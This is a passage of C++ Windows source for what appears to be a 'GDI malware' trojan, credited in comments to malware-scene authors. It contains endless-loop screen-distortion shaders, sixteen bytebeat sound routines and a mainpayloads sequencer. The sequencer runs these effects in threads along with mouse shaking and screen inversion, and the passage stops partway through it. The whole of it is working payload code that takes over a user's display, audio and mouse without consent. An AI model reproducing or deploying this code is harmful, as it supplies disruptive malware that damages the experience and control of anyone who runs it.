		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;

				int fx = (int)((i ^ 4) + (i * 4) * sqrt(x * i & i * y ^ x & i ^ y + i * x + y));

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI shader3(LPVOID lpvd)
{
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	while (true)
	{
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;

			int cx = x - (w / 3);
			int cy = y - (h / 3);

			int zx = (cx * cx);
			int zy = (cy * cy);

			int di = 96.0 + i;

			int fx = di + (di * tan(sqrt(zx + zy) / 108.0));
			rgbScreen[i].rgb += fx + i;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI shader4(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	while (true)
	{
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb += (x & y) | ((y + x) - i);
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI shader5(LPVOID lpvd) //credits to pankoza
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;


	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;
	float colorShift = 400.0;
	float colorIntensity = 0.15;
	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;
				int Xii = x * x + i;
				int Yii = y * y + i;
				int fx = (int)((i ^ 4) + (i * 4) * sqrt((Xii - i) * (Yii - i)));

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / colorShift + y / static_cast<float>(screenHeight) * colorIntensity, 1.0f);
				hslcolor.s = fmod(hslcolor.s + (x % 20) / 200.0f, 1.0f);
				hslcolor.l = fmod(hslcolor.l + (y % 10) / 100.0f, 1.0f);
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI shader6(LPVOID lpParam) {//credits to WinMalware
	HDC hdcScreen = GetDC(NULL);
	HDC hdcMem = CreateCompatibleDC(hdcScreen);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);

	BITMAPINFO bmi = { 0 };
	HBITMAP hbmTemp;
	RGBQUAD* rgbScreen = NULL;

	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biWidth = screenWidth;
	bmi.bmiHeader.biHeight = -screenHeight; // Negative height to ensure the bitmap is top-down
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biCompression = BI_RGB;

	hbmTemp = CreateDIBSection(hdcScreen, &bmi, DIB_RGB_COLORS, (void**)&rgbScreen, NULL, 0);
	SelectObject(hdcMem, hbmTemp);

	int i = 0;
	while (1) {
		// Capture the screen into the memory DC
		BitBlt(hdcMem, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY);

		for (int x = 0; x < screenWidth; x++) {
			for (int y = 0; y < screenHeight; y++) {
				int index = y * screenWidth + x;
				int fx = (x + i) ^ y;

				// Generate RGB colors based on the XOR pattern
				rgbScreen[index].rgbRed = (fx & 0xFF) ^ ((fx >> 8) & 0xFF);
				rgbScreen[index].rgbGreen = ((fx >> 16) & 0xFF) ^ (fx & 0xFF);
				rgbScreen[index].rgbBlue = ((fx >> 8) & 0xFF) ^ ((fx >> 16) & 0xFF);
			}
		}

		// Display the updated bitmap on the screen
		StretchBlt(hdcScreen, 0, 0, screenWidth, screenHeight, hdcMem, 0, 0, screenWidth, screenHeight, SRCCOPY);

		// Increment the position to create the scrolling effect
		i += 2; // Adjust the speed of the scrolling by changing this value

		Sleep(10); // Adjust the refresh rate by changing this value
	}

	ReleaseDC(NULL, hdcScreen);
	DeleteDC(hdcMem);
	DeleteObject(hbmTemp);

	return 0x00;
}

VOID WINAPI sound1() {//credits to fr4ctalz
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((0x9C40 / ((t & 0xFFF) + 1)) | (t >> (4 - ((t & 0x1000) != 0))) | ((t * (((t >> 13) & 3) + 1) * (((t & 0x4000) != 0) + 5)) >> ((t >> 11) & 2)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound2() {
	int nSamplesPerSec = 16000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(tan(t & 4096 ? t / 2 * (t ^ t % 255) | t >> 5 : t / 8 | (t & 8192 ? 4 * t : t)) * 129);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound3() {
	int nSamplesPerSec = 16000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(tan(t * (t >> 10 & t >> 13)) * 129);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound4() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(~(t + (31 * t | (t >> 4) + (1 + (t >> 9 & 2)) * t + t >> 5 ^ t >> 5) ^ t) >> 3);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound5() {
	int nSamplesPerSec = 18000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(tan(t % 125 & t >> 8 | t >> 4 | t * t >> 8 & t >> 8) * 129);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound6() {
	int nSamplesPerSec = 13000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(tan(t * (1 + (t >> 10) * (43 + 2 * (t >> 15 - (t >> 16) % 13) % 8) % 8) * (1 + (t >> 14) % 4)) * 129);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound7() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(tan(t + ~(t << 2 ^ t >> 7)) * 129);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound8() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(tan(((8 * t) | (t >> 3)) + ((32 * t) | (t >> 2) | (t >> 7))) * 129);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound9() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((t >> 5) ^ (t << ((t >> 2) % 4)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound10() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(tan(t * (0x32F376503 >> (t >> 13 & 27) & 127) | t >> 4 | t << 5) * 129);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound11() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((2 * t) & (-t >> 5) | (t >> 9) & (15 - t % ((t & 0x2CBB) != 0 ? 41 : 91) + 1)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound12() {
	int nSamplesPerSec = 11025, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(tan((t & 0xE ^ 3 | (t >> 8)) * (t >> 2)) * 129);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound13() {
	int nSamplesPerSec = 12000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(tan(t & t ^ ~(1 + (t >> 9 & t >> 8)) & 6765) * 129);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound14() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(tan(t * ((t >> 12 | t >> 9) & 241 & t >> 4)) * 129);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound15() {
	int nSamplesPerSec = 11025, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(tan(t * (t >> 12 & 13 ^ 2 | t >> 10 & 9)) * 129);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound16() {
	int nSamplesPerSec = 11025, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	BYTE bFreq;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		if ((0xD) != 0) bFreq = (BYTE)(t * (((t >> ((t >> 9) + 8 * (t >> 9) - 1)) ^ 1) % 0xD));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
void mainpayloads() {
	Sleep(5000);
	HANDLE thread0 = CreateThread(0, 0, mousedrawluminastaricon, 0, 0, 0);
	HANDLE thread0copy = CreateThread(0, 0, mouseshaking, 0, 0, 0);
	Sleep(1000);
	HANDLE thread1 = CreateThread(0, 0, shader1, 0, 0, 0);
	sound1();
	TerminateThread(thread1, 0);
	refreshscr();
	HANDLE thread2 = CreateThread(0, 0, shader2, 0, 0, 0);
	sound2();
	TerminateThread(thread2, 0);
	refreshscr();
	HANDLE thread3_num1 = CreateThread(0, 0, shader3, 0, 0, 0);
	HANDLE thread3_num2 = CreateThread(0, 0, balls, 0, 0, 0);
	sound3();
	TerminateThread(thread3_num1, 0);
	refreshscr();
	HANDLE thread4 = CreateThread(0, 0, drawbytebeat1, 0, 0, 0);
	sound4();
	TerminateThread(thread4, 0);
	refreshscr();
	HANDLE thread5_num1 = CreateThread(0, 0, notsrccopyscreen, 0, 0, 0);
	HANDLE thread5_num2 = CreateThread(0, 0, invertcircle, 0, 0, 0);
	HANDLE thread5_num3 = CreateThread(0, 0, invertsquare, 0, 0, 0);
	HANDLE thread5_num4 = CreateThread(0, 0, colourfulcircle, 0, 0, 0);
	HANDLE thread5_num5 = CreateThread(0, 0, colourfulsquare, 0, 0, 0);
	sound5();
	TerminateThread(thread5_num1, 0);
	TerminateThread(thread5_num2, 0);
	TerminateThread(thread5_num3, 0);
	TerminateThread(thread5_num4, 0);
	TerminateThread(thread5_num5, 0);
	refreshscr();
	HANDLE thread6 = CreateThread(0, 0, drawbytebeat2, 0, 0, 0);
	sound6();
	TerminateThread(thread6, 0);
	refreshscr();
	HANDLE thread7 = CreateThread(0, 0, shader4, 0, 0, 0);
	sound7();
	TerminateThread(thread7, 0);
	refreshscr();
	HANDLE thread8_num1 = CreateThread(0, 0, mosaic, 0, 0, 0);
	HANDLE thread8_num2 = CreateThread(0, 0, funnystretchblt, 0, 0, 0);
	HANDLE thread8_num3 = CreateThread(0, 0, textoutz, 0, 0, 0);
	sound8();
	TerminateThread(thread8_num1, 0);
	TerminateThread(thread8_num2, 0);
	refreshscr();
	HANDLE thread9_num1 = CreateThread(0, 0, grayscreenmove, 0, 0, 0);
